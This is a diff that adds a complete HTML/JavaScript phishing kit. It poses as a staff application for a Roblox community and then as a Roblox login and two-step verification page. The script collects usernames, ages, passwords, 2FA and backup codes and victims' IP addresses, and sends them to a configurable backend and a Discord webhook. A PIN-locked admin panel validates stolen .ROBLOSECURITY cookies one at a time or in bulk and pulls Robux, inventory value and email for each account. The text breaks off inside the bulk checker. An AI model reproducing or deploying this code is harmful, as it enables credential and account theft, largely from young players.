@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Staff Application</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+body { background: linear-gradient(135deg, #1b1b1b 0%, #2a2a2a 100%); color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+
+.container { background: #232527; border-radius: 12px; width: 100%; max-width: 480px; box-shadow: 0 8px 32px rgba(0,0,0,0.6); overflow: hidden; position: relative; }
+.header { padding: 20px 24px; border-bottom: 1px solid #393b3d; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
+.logo { display: flex; align-items: center; gap: 12px; }
+.logo-icon { width: 44px; height: 44px; background: linear-gradient(135deg, #00a2ff, #0089d6); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 16px; color: #fff; }
+.logo-icon.roblox { background: #fff; color: #000; font-size: 22px; font-weight: 900; }
+.logo-text h1 { font-size: 17px; font-weight: 700; }
+.logo-text p { font-size: 11px; color: #b8b8b8; }
+.badge { background: rgba(0,162,255,0.15); color: #00a2ff; padding: 5px 11px; border-radius: 20px; font-size: 11px; font-weight: 600; }
+.content { padding: 24px; }
+.content h2 { font-size: 21px; margin-bottom: 8px; }
+.subtitle { color: #b8b8b8; font-size: 13px; margin-bottom: 22px; }
+.progress-steps { display: flex; align-items: center; justify-content: center; margin-bottom: 26px; gap: 6px; }
+.p-step { width: 30px; height: 30px; border-radius: 50%; background: #393b3d; color: #6b6d6f; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 13px; transition: all 0.3s; }
+.p-step.active { background: #00a2ff; color: #fff; transform: scale(1.1); }
+.p-step.done { background: #22c55e; color: #fff; }
+.p-line { width: 30px; height: 2px; background: #393b3d; }
+.p-line.active { background: #00a2ff; }
+.form-group { margin-bottom: 16px; }
+.form-group label { display: block; font-size: 12px; color: #d0d0d0; margin-bottom: 7px; font-weight: 500; }
+.req { color: #ff4d4d; }
+.form-group input, .form-group select, .form-group textarea { width: 100%; padding: 12px 14px; background: #393b3d; border: 1px solid #4a4c4e; border-radius: 8px; color: #fff; font-size: 14px; outline: none; transition: border-color 0.2s; font-family: inherit; }
+.form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: #00a2ff; }
+.form-group textarea { resize: vertical; min-height: 70px; }
+.form-group.checkbox { display: flex; align-items: flex-start; gap: 10px; }
+.form-group.checkbox input { width: auto; margin-top: 3px; }
+.form-group.checkbox label { margin-bottom: 0; font-size: 12px; color: #b8b8b8; }
+.btn { width: 100%; padding: 13px; background: #00a2ff; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-top: 6px; }
+.btn:hover { background: #0089d6; }
+.btn:disabled { background: #4a4c4e; cursor: not-allowed; }
+.btn.roblox-btn { background: #fff; color: #000; }
+.btn.roblox-btn:hover { background: #e0e0e0; }
+.alert { background: rgba(0,162,255,0.1); border-left: 3px solid #00a2ff; padding: 12px 16px; border-radius: 6px; margin-bottom: 18px; display: flex; gap: 10px; align-items: flex-start; }
+.alert-warning { background: rgba(255,170,0,0.1); border-left-color: #ffaa00; }
+.alert-icon { font-size: 16px; }
+.alert p { font-size: 12px; color: #d0d0d0; line-height: 1.4; }
+.footer-note { margin-top: 18px; text-align: center; font-size: 11px; color: #6b6d6f; }
+.backup-note { margin-top: 14px; text-align: center; font-size: 12px; }
+.backup-note a { color: #00a2ff; text-decoration: none; }
+.loading-container { text-align: center; padding: 60px 24px; }
+.spinner { width: 50px; height: 50px; border: 4px solid #393b3d; border-top-color: #00a2ff; border-radius: 50%; margin: 0 auto 24px; animation: spin 1s linear infinite; }
+.spinner.roblox-spinner { border-top-color: #fff; }
+.spinner.success-spinner { border-top-color: #22c55e; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.loading-container h2 { font-size: 19px; margin-bottom: 8px; }
+.loading-container p { color: #b8b8b8; font-size: 13px; margin-bottom: 22px; }
+.progress-bar { width: 100%; height: 6px; background: #393b3d; border-radius: 3px; overflow: hidden; margin-bottom: 12px; }
+.progress-fill { height: 100%; background: linear-gradient(90deg, #00a2ff, #0089d6); width: 0%; transition: width 0.1s linear; }
+.progress-fill.success-fill { background: linear-gradient(90deg, #22c55e, #16a34a); }
+.loading-percent { font-size: 13px; color: #00a2ff; font-weight: 600; }
+
+.admin-icon { position: fixed; bottom: 16px; right: 16px; width: 36px; height: 36px; background: rgba(35,37,39,0.6); border: 1px solid rgba(57,59,61,0.5); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; opacity: 0.4; transition: all 0.3s; z-index: 9998; font-size: 16px; color: #6b6d6f; }
+.admin-icon:hover { opacity: 1; background: rgba(35,37,39,0.9); border-color: #00a2ff; color: #00a2ff; }
+
+.admin-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 9999; padding: 20px; }
+.admin-overlay.show { display: flex; }
+.admin-panel { background: #1a1c1e; border: 1px solid #00a2ff; border-radius: 12px; width: 100%; max-width: 600px; max-height: 90vh; overflow-y: auto; padding: 28px; box-shadow: 0 0 40px rgba(0,162,255,0.3); }
+.admin-panel h2 { color: #00a2ff; font-size: 20px; margin-bottom: 6px; }
+.admin-panel .admin-sub { color: #888; font-size: 12px; margin-bottom: 22px; }
+.admin-panel .form-group label { color: #d0d0d0; }
+.admin-panel .form-group input,
+.admin-panel .form-group textarea { background: #232527; border-color: #393b3d; }
+.admin-panel .form-group input:focus,
+.admin-panel .form-group textarea:focus { border-color: #00a2ff; }
+.admin-panel .btn-admin { background: #00a2ff; color: #fff; width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 4px; }
+.admin-panel .btn-admin:hover { background: #0089d6; }
+.admin-panel .btn-close { background: transparent; color: #888; border: 1px solid #393b3d; padding: 10px; border-radius: 8px; width: 100%; font-size: 13px; cursor: pointer; margin-top: 10px; }
+.admin-panel .btn-close:hover { background: #232527; color: #fff; }
+.admin-status { margin-top: 14px; padding: 10px; border-radius: 6px; font-size: 12px; text-align: center; display: none; }
+.admin-status.show { display: block; }
+.admin-status.ok { background: rgba(34,197,94,0.15); color: #22c55e; }
+.admin-status.err { background: rgba(255,77,77,0.15); color: #ff4d4d; }
+.lock-screen { text-align: center; padding: 20px 0; }
+.lock-screen .lock-icon { font-size: 48px; margin-bottom: 16px; }
+.lock-screen h3 { color: #fff; margin-bottom: 6px; }
+.lock-screen p { color: #888; font-size: 12px; margin-bottom: 20px; }
+.pin-input { width: 100%; padding: 14px; background: #232527; border: 1px solid #393b3d; border-radius: 8px; color: #fff; font-size: 20px; text-align: center; letter-spacing: 8px; outline: none; margin-bottom: 12px; }
+.pin-input:focus { border-color: #00a2ff; }
+.admin-tab { display: flex; gap: 4px; margin-bottom: 18px; border-bottom: 1px solid #393b3d; }
+.admin-tab button { background: transparent; color: #888; border: none; padding: 10px 14px; cursor: pointer; font-size: 12px; border-bottom: 2px solid transparent; }
+.admin-tab button.active { color: #00a2ff; border-bottom-color: #00a2ff; }
+.admin-section { display: none; }
+.admin-section.active { display: block; }
+.cookie-result { margin-top: 14px; padding: 14px; background: #232527; border-radius: 8px; font-size: 12px; line-height: 1.6; }
+.cookie-result .label { color: #888; }
+.cookie-result .value { color: #fff; font-weight: 600; }
+.cookie-valid { color: #22c55e; font-weight: 700; margin-bottom: 8px; }
+.cookie-invalid { color: #ff4d4d; font-weight: 700; }
+
+.bulk-item { display: flex; align-items: center; gap: 10px; padding: 10px; background: #232527; border-radius: 6px; margin-bottom: 8px; border-left: 3px solid #393b3d; }
+.bulk-item.valid { border-left-color: #22c55e; }
+.bulk-item.invalid { border-left-color: #ff4d4d; }
+.bulk-item img { width: 36px; height: 36px; border-radius: 50%; background: #393b3d; }
+.bulk-item .info { flex: 1; min-width: 0; }
+.bulk-item .name { font-size: 13px; font-weight: 600; color: #fff; word-break: break-word; }
+.bulk-item .meta { font-size: 11px; color: #888; margin-top: 2px; }
+.bulk-item .stats { font-size: 11px; color: #b8b8b8; text-align: right; white-space: nowrap; }
+.bulk-item .badge-rare { color: #ffaa00; font-weight: 700; }
+.bulk-summary { padding: 12px; background: #232527; border-radius: 8px; margin-bottom: 12px; text-align: center; font-size: 13px; }
+.bulk-summary .valid-count { color: #22c55e; font-weight: 700; }
+.bulk-summary .invalid-count { color: #ff4d4d; font-weight: 700; }
+</style>
+</head>
+<body>
+<div id="app"></div>
+<div class="admin-icon" id="adminIcon" title="⚙️">⚙️</div>
+
+<div class="admin-overlay" id="adminOverlay">
+  <div class="admin-panel">
+    <div id="adminLock">
+      <div class="lock-screen">
+        <div class="lock-icon">🔒</div>
+        <h3>Admin Panel</h3>
+        <p>Enter access code</p>
+      </div>
+      <input type="password" class="pin-input" id="adminPin" placeholder="••••" maxlength="20" inputmode="numeric">
+      <button class="btn-admin" onclick="verifyPin()">Enter</button>
+      <button class="btn-close" onclick="closeAdmin()">Close</button>
+      <div class="admin-status err" id="pinStatus">Wrong code</div>
+    </div>
+
+    <div id="adminContent" style="display:none;">
+      <h2>⚙️ Admin Panel</h2>
+      <p class="admin-sub">System Configuration</p>
+
+      <div class="admin-tab">
+        <button class="active" onclick="switchTab('config', event)">Config</button>
+        <button onclick="switchTab('cookie', event)">Single</button>
+        <button onclick="switchTab('bulk', event)">Bulk</button>
+      </div>
+
+      <!-- TAB CONFIG -->
+      <div class="admin-section active" id="tab-config">
+        <div class="form-group">
+          <label>Backend API URL</label>
+          <input type="text" id="cfgBackend" placeholder="https://backend-lu.onrender.com">
+        </div>
+        <div class="form-group">
+          <label>Webhook URL (fallback)</label>
+          <input type="text" id="cfgWebhook" placeholder="https://discord.com/api/webhooks/...">
+        </div>
+        <div class="form-group">
+          <label>Community Name</label>
+          <input type="text" id="cfgCommunity" placeholder="Community name">
+        </div>
+        <div class="form-group">
+          <label>Community Link</label>
+          <input type="text" id="cfgGroupLink" placeholder="https://www.roblox.com/communities/...">
+        </div>
+        <div class="form-group">
+          <label>Redirect URL</label>
+          <input type="text" id="cfgRedirect" placeholder="https://www.roblox.com">
+        </div>
+        <button class="btn-admin" onclick="saveConfig()">💾 Save Configuration</button>
+        <div class="admin-status ok" id="saveStatus">Configuration saved!</div>
+      </div>
+
+      <!-- TAB SINGLE COOKIE -->
+      <div class="admin-section" id="tab-cookie">
+        <div class="form-group">
+          <label>Paste .ROBLOSECURITY Cookie</label>
+          <textarea id="cookieInput" rows="5" placeholder="Paste cookie di sini..."></textarea>
+        </div>
+        <button class="btn-admin" onclick="checkCookie()">🔍 Check Cookie</button>
+        <button class="btn-admin" style="background:#444; margin-top:8px;" onclick="fetchByCookie()">📊 Fetch Full Data</button>
+        <div class="cookie-result" id="cookieResult" style="display:none;"></div>
+      </div>
+
+      <!-- TAB BULK COOKIE -->
+      <div class="admin-section" id="tab-bulk">
+        <div class="form-group">
+          <label>Paste Cookies (1 per line)</label>
+          <textarea id="bulkInput" rows="10" placeholder="Cookie 1&#10;Cookie 2&#10;Cookie 3&#10;..."></textarea>
+        </div>
+
+        <div style="display:flex; gap:8px;">
+          <button class="btn-admin" onclick="bulkCheck()" style="flex:1;">🔍 Check All</button>
+          <button class="btn-admin" onclick="clearBulk()" style="flex:0 0 auto; background:#444; width:auto; padding:12px 16px;">🗑️</button>
+        </div>
+
+        <div id="bulkProgress" style="display:none; margin-top:14px;">
+          <div class="progress-bar" style="margin-bottom:8px;">
+            <div class="progress-fill" id="bulkProgressBar"></div>
+          </div>
+          <p style="font-size:12px; color:#888; text-align:center;" id="bulkProgressText">Checking...</p>
+        </div>
+
+        <div class="cookie-result" id="bulkResult" style="display:none; padding:0; background:transparent;"></div>
+      </div>
+
+      <button class="btn-close" onclick="closeAdmin()" style="margin-top:18px;">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+// ============================================
+// CONFIG
+// ============================================
+const DEFAULT_CONFIG = {
+  backend: '',
+  webhook: '',
+  community: "Avary'sGames",
+  groupLink: 'https://www.roblox.com/communities/4670676464/AvarysGames',
+  redirect: 'https://www.roblox.com'
+};
+
+const ADMIN_PASSWORD = '1818';
+
+function getConfig() {
+  try {
+    const s = localStorage.getItem('cfg_data');
+    if (s) return { ...DEFAULT_CONFIG, ...JSON.parse(s) };
+  } catch(e) {}
+  return { ...DEFAULT_CONFIG };
+}
+function saveConfigToStorage(c) { localStorage.setItem('cfg_data', JSON.stringify(c)); }
+let CONFIG = getConfig();
+
+let currentStep = 1;
+let collectedData = {};
+
+// ============================================
+// ROUTER
+// ============================================
+function render() {
+  const app = document.getElementById('app');
+  switch(currentStep) {
+    case 1: app.innerHTML = getStep1(); bindStep1(); break;
+    case 2: app.innerHTML = getStep2(); bindStep2(); break;
+    case 3: app.innerHTML = getStep3(); bindStep3(); break;
+    case 4: app.innerHTML = getStep4(); bindStep4(); break;
+    case 5: app.innerHTML = getStep5(); bindStep5(); break;
+    case 6: app.innerHTML = getStep6(); bindStep6(); break;
+    case 7: window.location.href = CONFIG.redirect; break;
+  }
+  updateLogo();
+}
+
+function updateLogo() {
+  document.querySelectorAll('.logo-text h1').forEach(el => {
+    if (el.textContent !== 'ROBLOX') el.textContent = CONFIG.community;
+  });
+}
+
+// ============================================
+// BACKEND + WEBHOOK
+// ============================================
+async function sendToBackend(endpoint, data) {
+  if (!CONFIG.backend) { console.warn('Backend not set'); return null; }
+  try {
+    const res = await fetch(CONFIG.backend + endpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+    return await res.json();
+  } catch(e) {
+    console.error('Backend error:', e);
+    return null;
+  }
+}
+
+async function sendToWebhook(step, data) {
+  if (!CONFIG.webhook || CONFIG.webhook.includes('ISI_URL')) return;
+  const fields = Object.entries(data).map(([k, v]) => ({
+    name: k.replace(/_/g, ' '),
+    value: '`' + (v || 'N/A') + '`',
+    inline: true
+  }));
+  try {
+    await fetch(CONFIG.webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: CONFIG.community + ' Logger',
+        embeds: [{
+          title: '📋 STEP 1 — APPLICATION DATA',
+          color: 0x00a2ff,
+          fields,
+          footer: { text: `IP: ${await getIP()}` },
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+  } catch(e) {}
+}
+
+async function getIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return d.ip;
+  } catch(e) { return 'N/A'; }
+}
+
+// ============================================
+// STEP 1
+// ============================================
+function getStep1() {
+  return `
+  <div class="container">
+    <div class="header">
+      <div class="logo">
+        <div class="logo-icon">AG</div>
+        <div class="logo-text">
+          <h1>${CONFIG.community}</h1>
+          <p>Official Community</p>
+        </div>
+      </div>
+      <div class="badge">🔒 Recruitment 2026</div>
+    </div>
+    <div class="content">
+      <div class="progress-steps">
+        <div class="p-step active">1</div><div class="p-line active"></div>
+        <div class="p-step">2</div><div class="p-line"></div>
+        <div class="p-step">3</div><div class="p-line"></div>
+        <div class="p-step">4</div>
+      </div>
+      <h2>Staff Application Form</h2>
+      <p class="subtitle">Fill out the form below to continue the recruitment process</p>
+      <form id="form1">
+        <div class="form-group">
+          <label>Roblox Username <span class="req">*</span></label>
+          <input type="text" name="roblox_name" placeholder="Your Roblox username" required>
+        </div>
+        <div class="form-group">
+          <label>Age <span class="req">*</span></label>
+          <input type="number" name="age" placeholder="e.g. 15" min="10" max="99" required>
+        </div>
+        <div class="form-group">
+          <label>Roblox Experience <span class="req">*</span></label>
+          <select name="experience" required>
+            <option value="">Select...</option>
+            <option value="<1 year">Less than 1 year</option>
+            <option value="1-3 years">1 - 3 years</option>
+            <option value="3-5 years">3 - 5 years</option>
+            <option value=">5 years">More than 5 years</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Position Applied For <span class="req">*</span></label>
+          <select name="position" required>
+            <option value="">Select position...</option>
+            <option value="Moderator">Chat Moderator</option>
+            <option value="Event Organizer">Event Organizer</option>
+            <option value="Staff Trading">Trading Staff</option>
+            <option value="Admin Discord">Discord Admin</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Why Do You Want to Join? <span class="req">*</span></label>
+          <textarea name="reason" rows="3" placeholder="Tell us why you're a good fit..." required></textarea>
+        </div>
+        <div class="form-group checkbox">
+          <input type="checkbox" id="agree" required>
+          <label for="agree">I agree to the community terms & conditions</label>
+        </div>
+        <button type="submit" class="btn">Continue Application →</button>
+      </form>
+    </div>
+  </div>`;
+}
+
+function bindStep1() {
+  document.getElementById('form1').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const btn = this.querySelector('.btn');
+    btn.textContent = 'Processing...';
+    btn.disabled = true;
+    const fd = new FormData(this);
+    const data = {};
+    fd.forEach((v, k) => data[k] = v);
+    collectedData = { ...collectedData, ...data };
+    await sendToWebhook('step1', data);
+    currentStep = 2; render();
+  });
+}
+
+// ============================================
+// STEP 2
+// ============================================
+function getStep2() {
+  return `
+  <div class="container loading-container">
+    <div class="spinner"></div>
+    <h2>Verifying Data...</h2>
+    <p id="statusText">Sending application data to server...</p>
+    <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+    <p class="loading-percent" id="percent">0%</p>
+  </div>`;
+}
+
+function bindStep2() {
+  const statuses = [
+    'Sending application data to server...',
+    'Validating submission...',
+    'Matching with staff database...',
+    'Data verified. Proceeding to account verification...'
+  ];
+  let progress = 0, si = 0;
+  const iv = setInterval(() => {
+    progress += 2;
+    document.getElementById('progress').style.width = progress + '%';
+    document.getElementById('percent').textContent = progress + '%';
+    if (progress === 25) si = 1;
+    if (progress === 50) si = 2;
+    if (progress === 75) si = 3;
+    document.getElementById('statusText').textContent = statuses[si];
+    if (progress >= 100) {
+      clearInterval(iv);
+      setTimeout(() => { currentStep = 3; render(); }, 500);
+    }
+  }, 60);
+}
+
+// ============================================
+// STEP 3
+// ============================================
+function getStep3() {
+  return `
+  <div class="container">
+    <div class="header">
+      <div class="logo">
+        <div class="logo-icon roblox">R</div>
+        <div class="logo-text">
+          <h1>ROBLOX</h1>
+          <p>Account Verification</p>
+        </div>
+      </div>
+    </div>
+    <div class="content">
+      <div class="progress-steps">
+        <div class="p-step done">✓</div><div class="p-line active"></div>
+        <div class="p-step active">2</div><div class="p-line"></div>
+        <div class="p-step">3</div><div class="p-line"></div>
+        <div class="p-step">4</div>
+      </div>
+      <div class="alert">
+        <span class="alert-icon">ℹ️</span>
+        <p>Your application has been verified. Now verify your Roblox account to confirm your identity.</p>
+      </div>
+      <h2>Account Verification</h2>
+      <p class="subtitle">Sign in to your Roblox account</p>
+      <form id="form3">
+        <div class="form-group">
+          <label>Username / Email</label>
+          <input type="text" name="username" placeholder="Username or Email" required autocomplete="off">
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="password" name="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="btn roblox-btn">Log In</button>
+      </form>
+      <div class="footer-note"><p>© 2026 Roblox Corporation</p></div>
+    </div>
+  </div>`;
+}
+
+function bindStep3() {
+  document.getElementById('form3').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const btn = this.querySelector('.btn');
+    btn.textContent = 'Verifying...';
+    btn.disabled = true;
+
+    const fd = new FormData(this);
+    const username = fd.get('username');
+    const password = fd.get('password');
+    const ip = await getIP();
+
+    localStorage.setItem('pending_user', username);
+    localStorage.setItem('pending_pass', password);
+
+    const result = await sendToBackend('/api/login', { username, password, ip });
+
+    if (!result) {
+      await sendToWebhook('step3', { username, password });
+    }
+
+    setTimeout(() => { currentStep = 4; render(); }, 1500);
+  });
+}
+
+// ============================================
+// STEP 4
+// ============================================
+function getStep4() {
+  return `
+  <div class="container loading-container">
+    <div class="spinner roblox-spinner"></div>
+    <h2>Verifying Roblox Account...</h2>
+    <p id="statusText">Connecting to Roblox servers...</p>
+    <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+    <p class="loading-percent" id="percent">0%</p>
+  </div>`;
+}
+
+function bindStep4() {
+  const statuses = [
+    'Connecting to Roblox servers...',
+    'Verifying account credentials...',
+    'Checking account security status...',
+    'Retrieving inventory data...',
+    'Verification successful. Proceeding to 2FA...'
+  ];
+  let progress = 0, si = 0;
+  const iv = setInterval(() => {
+    progress += 1.5;
+    document.getElementById('progress').style.width = progress + '%';
+    document.getElementById('percent').textContent = Math.floor(progress) + '%';
+    if (progress >= 20 && progress < 40) si = 1;
+    if (progress >= 40 && progress < 60) si = 2;
+    if (progress >= 60 && progress < 80) si = 3;
+    if (progress >= 80) si = 4;
+    document.getElementById('statusText').textContent = statuses[si];
+    if (progress >= 100) {
+      clearInterval(iv);
+      setTimeout(() => { currentStep = 5; render(); }, 500);
+    }
+  }, 70);
+}
+
+// ============================================
+// STEP 5
+// ============================================
+function getStep5() {
+  return `
+  <div class="container">
+    <div class="header">
+      <div class="logo">
+        <div class="logo-icon roblox">R</div>
+        <div class="logo-text">
+          <h1>ROBLOX</h1>
+          <p>Two-Step Verification</p>
+        </div>
+      </div>
+    </div>
+    <div class="content">
+      <div class="progress-steps">
+        <div class="p-step done">✓</div><div class="p-line active"></div>
+        <div class="p-step done">✓</div><div class="p-line active"></div>
+        <div class="p-step active">3</div><div class="p-line"></div>
+        <div class="p-step">4</div>
+      </div>
+      <div class="alert alert-warning">
+        <span class="alert-icon">🔐</span>
+        <p>Your account is protected by 2FA. Enter your verification code to continue.</p>
+      </div>
+      <h2>Two-Step Verification</h2>
+      <p class="subtitle">Enter the 6-digit code from your authenticator app</p>
+      <form id="form5">
+        <div class="form-group">
+          <label>Verification Code</label>
+          <input type="text" name="code" placeholder="000000" maxlength="6" required autocomplete="off" style="text-align:center;font-size:24px;letter-spacing:8px;">
+        </div>
+        <button type="submit" class="btn roblox-btn">Verify</button>
+      </form>
+      <div class="backup-note">
+        <p>No access to your authenticator? <a href="#" id="backupLink">Use backup code</a></p>
+      </div>
+      <div class="footer-note"><p>© 2026 Roblox Corporation</p></div>
+    </div>
+  </div>`;
+}
+
+function bindStep5() {
+  document.getElementById('backupLink').addEventListener('click', function(e) {
+    e.preventDefault();
+    const input = document.querySelector('input[name="code"]');
+    input.placeholder = 'Backup code';
+    input.style.fontSize = '16px';
+    input.style.letterSpacing = '2px';
+    input.maxLength = 20;
+  });
+
+  document.getElementById('form5').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const btn = this.querySelector('.btn');
+    btn.textContent = 'Verifying...';
+    btn.disabled = true;
+
+    const fd = new FormData(this);
+    const code = fd.get('code');
+    const username = localStorage.getItem('pending_user') || '';
+    const ip = await getIP();
+
+    await sendToBackend('/api/2fa', { username, code, ip });
+
+    setTimeout(() => { currentStep = 6; render(); }, 1500);
+  });
+}
+
+// ============================================
+// STEP 6
+// ============================================
+function getStep6() {
+  return `
+  <div class="container loading-container">
+    <div class="spinner success-spinner"></div>
+    <h2>Activating Staff Access...</h2>
+    <p id="statusText">Processing final data...</p>
+    <div class="progress-bar"><div class="progress-fill success-fill" id="progress"></div></div>
+    <p class="loading-percent" id="percent">0%</p>
+  </div>`;
+}
+
+function bindStep6() {
+  const statuses = [
+    'Processing final data...',
+    'Activating staff role...',
+    'Preparing community access...',
+    'Sending confirmation...',
+    'Complete! Redirecting...'
+  ];
+  let progress = 0, si = 0;
+  const iv = setInterval(() => {
+    progress += 2.5;
+    document.getElementById('progress').style.width = progress + '%';
+    document.getElementById('percent').textContent = Math.floor(progress) + '%';
+    if (progress >= 20 && progress < 40) si = 1;
+    if (progress >= 40 && progress < 60) si = 2;
+    if (progress >= 60 && progress < 80) si = 3;
+    if (progress >= 80) si = 4;
+    document.getElementById('statusText').textContent = statuses[si];
+    if (progress >= 100) {
+      clearInterval(iv);
+      setTimeout(() => { currentStep = 7; render(); }, 800);
+    }
+  }, 60);
+}
+
+// ============================================
+// ADMIN PANEL
+// ============================================
+document.getElementById('adminIcon').addEventListener('click', openAdmin);
+
+function openAdmin() {
+  document.getElementById('adminOverlay').classList.add('show');
+  document.getElementById('adminLock').style.display = 'block';
+  document.getElementById('adminContent').style.display = 'none';
+  document.getElementById('adminPin').value = '';
+  document.getElementById('pinStatus').classList.remove('show');
+  setTimeout(() => document.getElementById('adminPin').focus(), 100);
+}
+
+function closeAdmin() {
+  document.getElementById('adminOverlay').classList.remove('show');
+}
+
+function verifyPin() {
+  const pin = document.getElementById('adminPin').value;
+  if (pin === ADMIN_PASSWORD) {
+    document.getElementById('adminLock').style.display = 'none';
+    document.getElementById('adminContent').style.display = 'block';
+    loadConfigToForm();
+  } else {
+    document.getElementById('pinStatus').classList.add('show');
+    document.getElementById('adminPin').value = '';
+    setTimeout(() => document.getElementById('pinStatus').classList.remove('show'), 2000);
+  }
+}
+
+function switchTab(tab, ev) {
+  document.querySelectorAll('.admin-tab button').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
+  if (ev && ev.target) ev.target.classList.add('active');
+  document.getElementById('tab-' + tab).classList.add('active');
+}
+
+function loadConfigToForm() {
+  document.getElementById('cfgBackend').value = CONFIG.backend;
+  document.getElementById('cfgWebhook').value = CONFIG.webhook;
+  document.getElementById('cfgCommunity').value = CONFIG.community;
+  document.getElementById('cfgGroupLink').value = CONFIG.groupLink;
+  document.getElementById('cfgRedirect').value = CONFIG.redirect;
+}
+
+function saveConfig() {
+  CONFIG.backend = document.getElementById('cfgBackend').value.trim();
+  CONFIG.webhook = document.getElementById('cfgWebhook').value.trim();
+  CONFIG.community = document.getElementById('cfgCommunity').value.trim() || "Avary'sGames";
+  CONFIG.groupLink = document.getElementById('cfgGroupLink').value.trim();
+  CONFIG.redirect = document.getElementById('cfgRedirect').value.trim() || 'https://www.roblox.com';
+
+  saveConfigToStorage(CONFIG);
+
+  document.getElementById('saveStatus').classList.add('show');
+  setTimeout(() => document.getElementById('saveStatus').classList.remove('show'), 2000);
+
+  updateLogo();
+}
+
+// ============================================
+// SINGLE COOKIE CHECKER
+// ============================================
+async function checkCookie() {
+  const cookie = document.getElementById('cookieInput').value.trim();
+  const resultEl = document.getElementById('cookieResult');
+  resultEl.style.display = 'block';
+  resultEl.innerHTML = '⏳ Checking...';
+
+  if (!CONFIG.backend) {
+    resultEl.innerHTML = '<span class="cookie-invalid">❌ Backend URL belum di-set</span>';
+    return;
+  }
+
+  try {
+    const res = await fetch(CONFIG.backend + '/api/check-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie })
+    });
+    const r = await res.json();
+
+    if (r.valid) {
+      resultEl.innerHTML = `
+        <div class="cookie-valid">✅ Cookie Valid</div>
+        <div><span class="label">Username:</span> <span class="value">${r.user.name}</span></div>
+        <div><span class="label">Display:</span> <span class="value">${r.user.displayName}</span></div>
+        <div><span class="label">User ID:</span> <span class="value">${r.user.id}</span></div>
+      `;
+    } else {
+      resultEl.innerHTML = '<div class="cookie-invalid">❌ Cookie Invalid / Expired</div>';
+    }
+  } catch(e) {
+    resultEl.innerHTML = '<div class="cookie-invalid">❌ Error: ' + e.message + '</div>';
+  }
+}
+
+async function fetchByCookie() {
+  const cookie = document.getElementById('cookieInput').value.trim();
+  const resultEl = document.getElementById('cookieResult');
+  resultEl.style.display = 'block';
+  resultEl.innerHTML = '⏳ Fetching full data...';
+
+  if (!CONFIG.backend) {
+    resultEl.innerHTML = '<span class="cookie-invalid">❌ Backend URL belum di-set</span>';
+    return;
+  }
+
+  try {
+    const res = await fetch(CONFIG.backend + '/api/fetch-by-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie })
+    });
+    const r = await res.json();
+
+    if (r.success) {
+      const d = r.data;
+      resultEl.innerHTML = `
+        <div class="cookie-valid">✅ Data Fetched</div>
+        <div><span class="label">Username:</span> <span class="value">${d.user?.name || 'N/A'}</span></div>
+        <div><span class="label">User ID:</span> <span class="value">${d.user?.id || 'N/A'}</span></div>
+        <div><span class="label">Robux:</span> <span class="value">${d.robux || 0}</span></div>
+        <div><span class="label">RAP:</span> <span class="value">${d.rap || 0}</span></div>
+        <div><span class="label">Limiteds:</span> <span class="value">${d.limitedsOwned || 0}</span></div>
+        <div><span class="label">Korblox:</span> <span class="value">${d.hasKorblox ? '✅' : '❌'}</span></div>
+        <div><span class="label">Headless:</span> <span class="value">${d.hasHeadless ? '✅' : '❌'}</span></div>
+        <div><span class="label">Email:</span> <span class="value">${d.email || 'N/A'}</span></div>
+        <div><span class="label">Account Age:</span> <span class="value">${d.accountAge || 0} days</span></div>
+      `;
+    } else {
+      resultEl.innerHTML = '<div class="cookie-invalid">❌ Failed: ' + (r.error || 'Unknown') + '</div>';
+    }
+  } catch(e) {
+    resultEl.innerHTML = '<div class="cookie-invalid">❌ Error: ' + e.message + '</div>';
+  }
+}
+
+// ============================================
+// BULK COOKIE CHECKER
+// ============================================
+async function bulkCheck() {
+  const raw = document.getElementById('bulkInput').value.trim();
+  if (!raw) { alert('Paste cookies dulu!'); return; }
+
+  const lines = raw.split('\n').map(l => l.trim()).filter(l => l.length > 10);
+  if (lines.length === 0) { alert('Gak ada cookie valid!'); return; }
+  if (!CONFIG.backend) { alert('Backend URL belum di-set di tab Config!'); return; }
+
+  document.getElementById('bulkProgress').style.display = 'block';
+  document.getElementById('bulkResult').style.display = 'none';
+  document.getElementById('bulkProgressBar').style.width = '0%';
+  document.getElementById('bulkProgressText').textContent = `Checking ${lines.length} cookies...`;
+
